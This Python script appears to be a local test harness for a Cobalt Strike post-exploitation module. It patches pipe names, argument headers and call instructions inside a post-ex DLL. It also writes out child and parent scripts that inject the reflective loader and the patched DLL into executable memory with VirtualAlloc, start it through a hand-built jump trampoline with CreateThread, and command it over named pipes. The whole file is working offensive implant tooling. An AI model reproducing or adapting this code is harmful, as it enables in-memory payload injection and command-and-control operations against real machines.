# -*- coding: utf-8 -*-
"""kit_bg_harness.py - bg mode local test: single=0 config, dual spawner
patches (0x44a1 once + 0x45c5 follow-up), interleaved peek-loop parent
(sync duplex pipe forbids concurrent Read+Write on one handle - gle 233)."""
import os
import struct
import subprocess
import sys
import time

STAMP = str(int(time.time()))
CTRL = r"\\.\pipe\kit_bg_c_" + STAMP
OUT = r"\\.\pipe\kit_bg_o_" + STAMP
GATE = r"C:\Users\Public\kit2_go.txt"
if os.path.exists(GATE):
    os.remove(GATE)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import kit_local_harness2 as H

WIRE = open(r"C:\Users\Public\bt_hello_12b.bin", "rb").read()
_zf = H.L(OUT.encode() + bytes([0]))
_bf = H.L(WIRE)
FOLLOW = _zf + _bf  # official kit follow-up frame: [z output_pipe][b wire]

ARGS = (struct.pack(">i", 0) + struct.pack(">i", 2) + struct.pack(">i", 1)
        + H.L(b"ntdll.dll!RtlUserThreadStart+0x21\x00")
        + H.L(OUT.encode() + b"\x00") + H.L(WIRE))   # single_shot = 0

PIPEMARK = b"POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE"
FULLPIPE_MARK = b"\\\\.\\pipe\\" + PIPEMARK
ARGSMARK = b"_POSTEX_ARGUMENTS_"


def patch_kit(data, ctrl):
    d = bytearray(data)
    i = bytes(d).find(FULLPIPE_MARK)
    assert i > 0
    name = ctrl.encode() + b"\x00"
    name = name + b"\x00" * (len(FULLPIPE_MARK) - len(name))
    d[i:i + len(FULLPIPE_MARK)] = name
    i = bytes(d).find(ARGSMARK)
    assert i > 0
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\x00\x00\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    d[i:i + 20] = hdr
    o1 = 0x44a1 - 0x1000 + 0x400
    assert d[o1] == 0xE8
    struct.pack_into("<i", d, o1 + 1, 0x3d40 - 0x44a6)
    o2 = 0x45c5 - 0x1000 + 0x400
    assert d[o2] == 0xE8
    struct.pack_into("<i", d, o2 + 1, 0x3d40 - 0x45ca)
    # A3: skip first BOF (0x44db call 0x4170) -> enter bg loop directly
    # The bg loop at 0x44f0 only needs gPipeHandle (global) and r13 (=0)
    # It does NOT use r15 (0x4170 return) - so we can safely skip 0x4170
    o3 = 0x44de - 0x1000 + 0x400
    assert d[o3] == 0xE8
    d[o3:o3+5] = bytes([0x90, 0x90, 0x90, 0x90, 0x90])  # NOP the call
    return bytes(d)


CHILD = r"C:\Users\Public\kit2_child.py"
child_src = (
    "import ctypes, struct, sys, time, os\n"
    "from ctypes import wintypes\n"
    "CTRL = sys.argv[1]; OUT = sys.argv[2]\n"
    "sys.path.insert(0, r'C:\\Users\\Administrator\\Desktop\\cobaltstrike\\cobaltstrike-beacon\\feat-post-4.9.1\\tools')\n"
    "import kit_bg_harness as B\n"
    "k32 = ctypes.windll.kernel32\n"
    "k32.VirtualAlloc.restype = ctypes.c_void_p\n"
    "dll = B.patch_kit(open(r'C:\\Users\\Public\\kit_async.x64.dll', 'rb').read(), CTRL)\n"
    "loader = open(r'C:\\Users\\Administrator\\Desktop\\cobaltstrike\\cobaltstrike-ts\\p3-llvm-bench\\src\\main\\resources\\resources\\postex-loader.x64.bin', 'rb').read()\n"
    "blob = loader + dll\n"
    "base = k32.VirtualAlloc(None, len(blob), 0x3000, 0x40)\n"
    "ctypes.memmove(base, blob, len(blob))\n"
    "ab = k32.VirtualAlloc(None, len(B.ARGS), 0x3000, 0x04)\n"
    "ctypes.memmove(ab, B.ARGS, len(B.ARGS))\n"
    "tramp = k32.VirtualAlloc(None, 0x1000, 0x3000, 0x40)\n"
    "code = bytearray(11)\n"
    "code[0] = 0x41; code[1] = 0xB9; code[2:6] = struct.pack('<I', 1)\n"
    "code[6] = 0xE9\n"
    "code[7:11] = struct.pack('<i', base - (tramp + 11))\n"
    "ctypes.memmove(tramp, bytes(code), 11)\n"
    "print('pid', os.getpid(), flush=True)\n"
    "while not os.path.exists(r'" + GATE + "'):\n"
    "    time.sleep(0.2)\n"
    "k32.CreateThread(None, 0, ctypes.cast(tramp, wintypes.LPVOID), ctypes.c_void_p(ab), 0, None)\n"
    "time.sleep(100)\n"
    "print('SURVIVED', flush=True)\n"
)
open(CHILD, "w").write(child_src)

PARENT = r"C:\Users\Public\kit2_parent3.py"
parent_src = (
    "import time, ctypes, sys, os\n"
    "from ctypes import wintypes\n"
    "k32 = ctypes.windll.kernel32\n"
    "k32.CreateFileW.restype = wintypes.HANDLE\n"
    "k32.WriteFile.restype = wintypes.BOOL\n"
    "k32.ReadFile.restype = wintypes.BOOL\n"
    "GENERIC_RW = 0x80000000 | 0x40000000\n"
    "def open_pipe(name, timeout=30):\n"
    "    t0 = time.time()\n"
    "    while time.time() - t0 < timeout:\n"
    "        h = k32.CreateFileW(name, GENERIC_RW, 0, None, 3, 0, None)\n"
    "        if h and h != wintypes.HANDLE(-1).value:\n"
    "            return h\n"
    "        time.sleep(0.2)\n"
    "    return None\n"
    "CTRL, OUT, FOLLOW_PATH = sys.argv[1], sys.argv[2], sys.argv[3]\n"
    "while not os.path.exists(r'" + GATE + "'):\n"
    "    time.sleep(0.1)\n"
    "hc = open_pipe(CTRL, 20)\n"
    "ho = open_pipe(OUT, 60)\n"
    "print('ctrl:', hc is not None, 'out:', ho is not None, flush=True)\n"
    "if not ho: raise SystemExit\n"
    "follow = open(FOLLOW_PATH, 'rb').read()\n"
    "total = 0\n"
    "sent = False\n"
    "t0 = time.time()\n"
    "while time.time() - t0 < 150:\n"
    "    avail = wintypes.DWORD(0)\n"
    "    avail2 = wintypes.DWORD(0)\n"
    "    k32.PeekNamedPipe(ho, None, 0, None, ctypes.byref(avail), None)\n"
    "    k32.PeekNamedPipe(hc, None, 0, None, ctypes.byref(avail2), None)\n"
    "    if avail2.value:\n"
    "        b2 = ctypes.create_string_buffer(65536)\n"
    "        g2 = wintypes.DWORD(0)\n"
    "        if k32.ReadFile(hc, b2, 65536, ctypes.byref(g2), None) and g2.value:\n"
    "            total += g2.value\n"
    "            t2 = bytes(c if 32 <= c < 127 else 46 for c in b2.raw[:g2.value][:80]).decode()\n"
    "            print('CTRL-RECV:', t2, flush=True)\n"
    "    if avail.value:\n"
    "        buf = ctypes.create_string_buffer(65536)\n"
    "        got = wintypes.DWORD(0)\n"
    "        if k32.ReadFile(ho, buf, 65536, ctypes.byref(got), None) and got.value:\n"
    "            total += got.value\n"
    "            print('RECV hex:', buf.raw[:got.value][:min(got.value,96)].hex(), flush=True)\n"
    "            txt = bytes(c if 32 <= c < 127 else 46 for c in buf.raw[:got.value][:80]).decode()\n"
    "            print('RECV txt:', txt, flush=True)\n"
    "        continue\n"
    "    if (not sent) and total > 0:\n"
    "        wrote = wintypes.DWORD(0)\n"
    "        ok1 = k32.WriteFile(hc, follow, len(follow), ctypes.byref(wrote), None)\n"
    "        g1 = k32.GetLastError()\n"
    "        wrote2 = wintypes.DWORD(0)\n"
    "        ok2 = k32.WriteFile(hc, follow, len(follow), ctypes.byref(wrote2), None)\n"
    "        g2 = k32.GetLastError()\n"
    "        print('follow-up ctrl:', bool(ok1), wrote.value, 'gle=', g1, '| out:', bool(ok2), wrote2.value, 'gle=', g2, flush=True)\n"
    "        sent = ok1 or ok2\n"
    "    time.sleep(0.3)\n"
    "print('TOTAL bytes:', total, flush=True)\n"
)
open(PARENT, "w").write(parent_src)

if __name__ == "__main__":
    open(r"C:\Users\Public\kit_follow.bin", "wb").write(FOLLOW)
    p = subprocess.Popen([sys.executable, "-I", CHILD, CTRL, OUT], cwd=r"C:\Users\Public",
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    pid = int(p.stdout.readline().decode().split()[1])
    print("child pid", pid)
    p2 = subprocess.Popen([sys.executable, "-I", PARENT, CTRL, OUT,
                           r"C:\Users\Public\kit_follow.bin"], cwd=r"C:\Users\Public",
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    open(GATE, "w").write("go")
    try:
        p2.wait(timeout=150)
    except Exception:
        p2.kill()
    try:
        p.kill()
    except Exception:
        pass
    print("=== PARENT ===")
    print(p2.stdout.read().decode(errors="replace")[:1500])
